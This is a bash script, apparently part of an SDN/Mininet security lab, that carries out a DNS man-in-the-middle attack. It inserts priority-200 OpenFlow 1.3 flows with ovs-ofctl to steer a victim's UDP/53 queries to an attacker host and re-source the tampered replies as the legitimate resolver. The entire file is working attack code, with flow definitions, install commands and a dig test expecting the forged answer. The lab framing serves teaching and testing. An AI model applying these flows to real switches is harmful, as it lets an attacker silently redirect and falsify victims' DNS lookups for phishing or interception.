#!/usr/bin/env bash
#
# Attack 2 -- DNS man-in-the-middle via OpenFlow rule insertion (standalone
# fallback for the ONOS push_dns_hijack.py; same flows, no controller).
#
# Installs two high-priority OpenFlow 1.3 flows on switch s1 using ovs-ofctl:
#
#   FORWARD : the victim's DNS query (UDP/53) to the legit resolver is steered
#             to the attacker host h3 (dst IP + dst MAC rewritten to h3), where
#             the DNS proxy forwards it to the real server and relays the answer.
#   RETURN  : h3's reply is re-sourced as the legit resolver (src IP rewritten
#             back to 10.0.30.10) so the victim accepts it transparently.
#
# These flows sit at priority 200, above whatever the controller (ONOS) or the
# standalone switch installs for normal forwarding, so DNS is diverted while all
# other traffic is untouched. This is the "install OpenFlow rules at the switch"
# method the proposal requires -- just inserted directly with ovs-ofctl instead
# of through the ONOS REST API.
#
# Values (switch, ports, attacker MAC, IPs) come from /tmp/dns_hijack_env.sh,
# which dns_topo.py writes on startup. Run this in a second terminal (root shell)
# while the Mininet CLI stays open, or from the CLI as:  mininet> sh bash dns_hijack.sh
#
# Usage:
#   sudo bash dns_hijack.sh            # install the hijack
#   sudo bash dns_hijack.sh --dry-run  # print the flows without installing
set -euo pipefail

ENV_FILE=/tmp/dns_hijack_env.sh
if [[ ! -f "$ENV_FILE" ]]; then
    echo "ERROR: $ENV_FILE not found. Start dns_topo.py first (it writes this file)." >&2
    exit 1
fi
# shellcheck disable=SC1090
source "$ENV_FILE"

OFCTL="ovs-ofctl -O OpenFlow13"

FORWARD="priority=200,udp,in_port=${P_H1},nw_dst=${LEGIT_DNS},tp_dst=53,\
actions=mod_dl_dst:${H3_MAC},mod_nw_dst:${ROGUE_IP},output:${P_H3}"

RETURN="priority=200,udp,in_port=${P_H3},nw_src=${ROGUE_IP},tp_src=53,\
actions=mod_nw_src:${LEGIT_DNS},output:${P_H1}"

echo "Switch        : ${SW}"
echo "Victim  h1    : ${VICTIM_IP}  (s1 port ${P_H1})"
echo "Attacker h3   : ${ROGUE_IP}   (s1 port ${P_H3}, MAC ${H3_MAC})"
echo "Legit resolver: ${LEGIT_DNS}  -> real answer ${LEGIT_ANSWER}"
echo "Attacker answer: ${ROGUE_ANSWER}  (tampered record)"
echo
echo "FORWARD flow: ${FORWARD}"
echo "RETURN  flow: ${RETURN}"

if [[ "${1:-}" == "--dry-run" ]]; then
    echo; echo "(dry-run: nothing installed)"
    exit 0
fi

$OFCTL add-flow "${SW}" "${FORWARD}"
$OFCTL add-flow "${SW}" "${RETURN}"

echo
echo "Installed. Hijack flows now on ${SW}:"
$OFCTL dump-flows "${SW}" | grep -E 'tp_dst=53|tp_src=53' || true
echo
echo "Test from the Mininet CLI:  h1 dig +short @${LEGIT_DNS} www.lab.example"
echo "  expect ${ROGUE_ANSWER} (was ${LEGIT_ANSWER} before the attack)."
